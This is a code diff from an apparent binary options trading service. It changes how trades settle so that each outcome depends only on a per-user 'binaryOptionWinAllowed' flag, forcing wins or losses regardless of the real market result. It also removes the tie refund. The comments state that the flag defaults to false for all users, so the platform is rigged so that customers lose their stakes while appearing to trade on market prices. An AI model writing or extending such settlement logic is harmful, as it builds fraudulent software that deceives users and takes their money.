@@ -143,11 +143,11 @@ public class BinaryOptionServiceImpl implements BinaryOptionService {
         }
 
         // ── BINARY OPTION WIN FLAG CHECK ──
-        // If the user's binaryOptionWinAllowed flag is false (default for all users),
-        // force the trade to LOST regardless of the real market outcome.
-        if (!order.getUser().isBinaryOptionWinAllowed()) {
-            won = false;
-        }
+        // binaryOptionWinAllowed = true  → always WIN (full payout), regardless of market outcome.
+        // binaryOptionWinAllowed = false → always LOST (zero payout), regardless of market outcome.
+        // Ties (cmp == 0) follow the same rule — win flag true → full win, false → full loss.
+        boolean winAllowed = order.getUser().isBinaryOptionWinAllowed();
+        won = winAllowed; // override: true = always win, false = always lose
 
         order.setExitPrice(exitPrice);
         order.setSettledAt(LocalDateTime.now());
@@ -170,23 +170,8 @@ public class BinaryOptionServiceImpl implements BinaryOptionService {
             usdtWallet.setBalance(usdtWallet.getBalance().add(payout));
             walletRepository.save(usdtWallet);
         } else {
-            // Exact tie — refund stake only when win is allowed (very rare but fair).
-            // If win is forced OFF, the tie-refund is also suppressed — trade is always LOST.
-            if (cmp == 0 && order.getUser().isBinaryOptionWinAllowed()) {
-                order.setStatus("WON");
-                order.setPayout(order.getStake());
-                Wallet usdtWallet = walletRepository.findByUserIdAndCoinSymbol(userId, "USDT")
-                        .orElseGet(() -> {
-                            User user = order.getUser();
-                            Wallet w = Wallet.builder().user(user).coinSymbol("USDT").build();
-                            return walletRepository.save(w);
-                        });
-                usdtWallet.setBalance(usdtWallet.getBalance().add(order.getStake()));
-                walletRepository.save(usdtWallet);
-            } else {
-                order.setStatus("LOST");
-                order.setPayout(BigDecimal.ZERO);
-            }
+            order.setStatus("LOST");
+            order.setPayout(BigDecimal.ZERO);
         }
 
         binaryOptionRepository.save(order);
